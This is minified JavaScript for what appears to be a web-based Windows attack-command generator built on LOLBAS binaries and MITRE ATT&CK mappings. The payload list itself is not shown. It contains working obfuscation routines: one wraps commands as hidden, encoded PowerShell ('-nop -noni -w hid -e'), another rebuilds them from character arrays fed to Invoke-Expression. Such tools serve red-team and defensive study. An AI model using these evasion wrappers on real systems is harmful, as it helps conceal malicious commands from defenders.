function updateSelectBinElem(e){let t=document.getElementById("options_1_bin");t.innerHTML="";const n=Object.keys(PAYLOADS[e]);for(i=0;i<n.length;i++){const e=document.createElement("option");e.value=n[i],e.textContent=n[i],t.appendChild(e)}}function toBase64(e){const t=[];for(let n=0;n<e.length;n++){const o=e.charCodeAt(n);t.push(255&o),t.push(o>>8&255)}const n=String.fromCodePoint.apply(null,t);return btoa(n)}function obfsBase64(e,t){return"Command Prompt"===t?"# No available on Command Prompt":`powershell.exe -nop -noni -w hid -e ${toBase64(e)}`}function obfsSplit(e,t){for(chars=[],i=0;i<e.length;i++)" "==e[i]?chars.push("' '"):"'"==e[i]||'"'==e[i]?chars.push("'\"'"):chars.push(`'${e[i]}'`);const n=chars.join("+");return"Command Prompt"===t?"# No available on Command Prompt":`$cmd = [char[]](${n}) -Join '';Invoke-Expression $cmd`}function obfs(e,t,n){switch(n){case"Base64":return obfsBase64(e,t);case"Split":return obfsSplit(e,t);default:return e}}function genPayload1(e,t){const n=PAYLOADS[e][t];let o=n.cmd;const l=n.cli,d=n.adminRequired,i=n.mitre,a=n.lolbas,s=n.desc,c=document.getElementById("options_1_links_mitre");i?(c.href=i.url,c.textContent=i.id,c.style.display="inline"):c.style.display="none";const p=document.getElementById("options_1_links_lolbas");a?(p.href=a,p.textContent="LOLBAS",p.style.display="inline"):p.style.display="none";const u=document.getElementById("desc_1_p");u.textContent=s||"No additional information.";document.getElementById("payload_1_pre_labels_admin").style.display=d?"inline":"none";const m=document.getElementById("payload_1_pre_labels_cli");document.getElementById("payload_1_pre_code").textContent=o,l?(m.style.display="inline",m.textContent="Run on "+l):m.style.display="none"}function genPayload2(){const e=document.getElementById("options_1_purpose").value,t=document.getElementById("options_1_bin").value;let n=document.getElementById("payload_1_pre_code").innerText;const o=document.getElementById("options_2_obfs").value,l=PAYLOADS[e][t],d=l.cli,i=l.adminRequired;l.mitre;n=obfs(n,d,o);document.getElementById("payload_2_pre_code").textContent=n;document.getElementById("payload_2_pre_labels_admin").style.display=i?"flex":"none";const a=document.getElementById("payload_2_pre_labels_cli");d?(a.style.display="inline",a.textContent="Run on "+d):a.style.display="none"}function update1(){genPayload1(document.getElementById("options_1_purpose").value,document.getElementById("options_1_bin").value);genPayload2(document.getElementById("options_2_obfs").value)}function update2(){genPayload2(document.getElementById("options_2_obfs").value)}function updatePurpose(){updateSelectBinElem(document.getElementById("options_1_purpose").value),update1()}function showPopup(){const e=document.getElementById("copied-popup");e.style.display="block",setTimeout((()=>{e.style.display="none"}),3e3)}function copy1(){const e=document.getElementById("payload_1_pre_code").innerText;navigator.clipboard.writeText(e).then((()=>{showPopup()})).catch((e=>{console.error("Failed to copy: ",e)}))}function copy2(){const e=document.getElementById("payload_2_pre_code").innerText;navigator.clipboard.writeText(e).then((()=>{showPopup()})).catch((e=>{console.error("Failed to copy: ",e)}))}updatePurpose();